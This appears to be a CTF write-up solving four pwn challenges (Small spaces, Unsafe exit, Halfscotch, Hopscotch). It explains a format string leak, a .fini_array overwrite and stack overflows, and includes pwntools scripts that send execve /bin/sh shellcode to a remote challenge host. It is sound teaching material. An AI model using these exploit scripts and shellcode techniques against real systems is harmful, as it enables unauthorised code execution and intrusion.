## Small spaces

```c
#include<stdio.h>

int main(){
    setvbuf(stdout, NULL, _IONBF, 0);

    char name[9];
    char flag[100];
    FILE* stream;
    stream = fopen("flag.txt","r");
    fread(&flag,sizeof(char), 100, stream);
    fclose(stream);
    puts("What's your name? (less than 9 characters please!)");
    fgets(name,8,stdin);
    printf("Welcome, ");
    printf(name);
    return 0;
}
```

In this challenge, the flag is read onto the stack in the flag variable. We also have a format string vulnerability on line 15 that we can use to leak stack values. However, our payload can only be 8 bytes long. If we just used `%x` we wouldn't have enough space (we need `%x` * 7 to read the first stack value. The first 6 read from the [6 registers used to store the first 6 'arguments'](https://ctf101.org/binary-exploitation/what-are-calling-conventions/).) However, on UNIX, we can use [`$` to specify the argument index](https://stackoverflow.com/questions/19327441/gcc-dollar-sign-in-printf-format-string) to print. Thus, we can read the flag by trying a few different memory offsets.



## Unsafe exit

```c
#include<stdio.h>
void win(){
    system("/bin/sh");
}
int main(){
    setvbuf(stdout, NULL, _IONBF, 0);

    long where;
    long what;
    printf("Please enter where you went and what you did there: ");
    scanf("%ld %ld",&where,&what);
    printf("Saving data to database...\n");
    *(long*)where = what;
    printf("Thanks for using UnsafeExit. You can now exit unsafely!\n");
    return 0;
}
```

This program allows us to write to arbitrary memory locations. Using `checksec`, we find that the binary is compiled with RELRO off. 

```
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

This means that there is no write protection for many areas of the binary. From here, there are several locations that we can write to to control the flow of the program. The easiest location is the `.fini_array` section of the binary. Running `objdump -x chal`, we find under `Sections`:

```
18 .fini_array   00000008  0000000000403210  0000000000403210  00002210  2**3
                  CONTENTS, ALLOC, LOAD, DATA

```

After running the main function, any functions whose address is in `.fini_array` will be run. This makes `.fini_array` a good target for exploitation because its address is always constant and easily determined. 

You can use the following script to obtain the address of any section in an ELF:

```python
def get_section_address(elf, section_name):
    possible = [x for x in elf.sections if x.name == section_name]
    if not possible:
        raise Exception(f"{section_name} not found")
    addresses = [x for x in elf.search(possible[0].data())]
    if len(addresses) > 1:
        print("Warning: Multiple sections contain same data found")
    return addresses[0]
```

Once the address of `.fini_array` is obtained, write the address of `win` to it and you'll get a shell.



## Halfscotch

Comments: Shellcode challenges are actually very very common. You'll probably see one at every beginner CTF.

```c
#include<stdio.h>

int main(){
    setvbuf(stdout, NULL, _IONBF, 0);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    char name[112];
    name[111]=69;
    printf("Let's start at %p\n",&name); 
    fgets(name, 130, stdin);
    printf("Hello, %s", name);
    puts("Let's play hopscotch");
    if(name[111] != 69){
      printf("Outstanding move, but that's illegal.");
      exit(0);
    }
    printf("I guess you lost lmao");
    return 0;
}
```

We observe that there is a buffer overflow vulnerability because we are writing up to 130 bytes into a 112 byte buffer. However, byte 111 needs to be 69, otherwise the program exits before it can jump to the overwritten rip. Running `checksec`, we find that the program has RWX segments.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

This means that the stack (a region we have some control over) is executable. If you see this in a CTF it's probably almost always shellcode. Shellcode is assembly that, when executed, gives us a shell. If we are able to get our shellcode into our stack, and trick the program into jumping to our shellcode, we can get a shell. Fortunately, the address of our input has been given to us, so we know exactly where to jump to. You can get shellcode from various websites, like exploitdb.com, but I find that the pwntools shellcraft module can generate shellcode that conveniently works. Since the length of our shellcode is much less than 111 characters, we can bypass the canary very easily.

```python
from pwn import *
from binascii import *

p = remote("ctf.nush.app",1339)
e = ELF("./chal")
context.binary = e

l = p.recvline()
start = int(l[len("Let's start at 0x"):-1],16)
print(hex(start))
shellcode = asm(shellcraft.sh())
p.sendline(shellcode + b"\xcc"*(111-len(shellcode))+b"E"+b"a"*8+p64(start))
p.interactive()
```

## Hopscotch

```c
#include<stdio.h>

int main(){
    setvbuf(stdout, NULL, _IONBF, 0);
    
    char name[16];
    name[16-1]=69;
    puts("Can you JMP to the destination?");
    printf("Let's start at %p\n",&name); 
    fgets(name, 48, stdin);
    printf("Hello, %s", name);
    puts("Let's play hopscotch");
    if(name[16-1] != 69){
      printf("Outstanding move, but that's illegal.");
      exit(0);
    }
    printf("I guess you lost lmao");
    return 0;
}
```

With a few tweaks, this challenge is much much harder than halfscotch. Our total payload size can only be 48 characters, and we're interrupted in the middle by the canary. This is a very big problem because the length of our shellcode (around 25 characters) is greater than 16. For this challenge, we will have to delve into the assembly that constitutes our shellcode.

```assembly
xor rdx, rdx
movabs rbx, 0x68732f2f6e69622f # moves /bin/sh into rbx
xor rsi, rsi
push rax
push rbx
push rsp
pop rdi
mov al, 0x3b # syscall code for execve
syscall 
```

Due to the canary at byte 15, we are forced to split our shellcode into 2 parts. We can use a jump instruction to jump over the canary into the other part. Here's a visual representation of the stack.

```
|       buffer (16 bytes)         |
|part 1 (15 bytes)|canary (1 byte)|rbp (8 bytes)|rip (8 bytes)| remaining writable stack (16 bytes) |
```

The first 2 instructions of the shellcode already take up 13 bytes. We only have 2 bytes to jump to the next part. Thus, there's not enough space to jump to a specific memory address. Fortunately, when the `ret` instruction is called, `rsp` is set to the end of `rip` (because the stack frame is discarded). This happens to be where the second part of our shellcode is. Thus, we can just `jmp rsp` which nicely fits in 2 bytes.

```
|       buffer (16 bytes)         |
|part 1 (15 bytes)|canary (1 byte)|rbp (8 bytes)|rip (8 bytes)| remaining writable stack (16 bytes) |
                                                              ^ rsp is here :)
```

```python
from pwn import *
from binascii import *

p = remote("ctf.nush.app",1340)
e = ELF("./chal")
context.binary = e


p.recvline()
l = p.recvline()
start = int(l[len("Let's start at 0x"):-1],16)
s = asm(f"""
xor rdx, rdx
movabs rbx, 0x68732f2f6e69622f
jmp rsp
""")
s2 = asm("""
xor rsi, rsi
push rax
push rbx
push rsp
pop rdi
mov al, 0x3b
syscall
""")
print(len(s),s)
assert len(s)<16
pl = s + b"\xcc"*(15-len(s))+b"E"+b"a"*8+p64(start)+s2
assert len(pl) < 48
p.sendline(pl)
p.interactive()
```

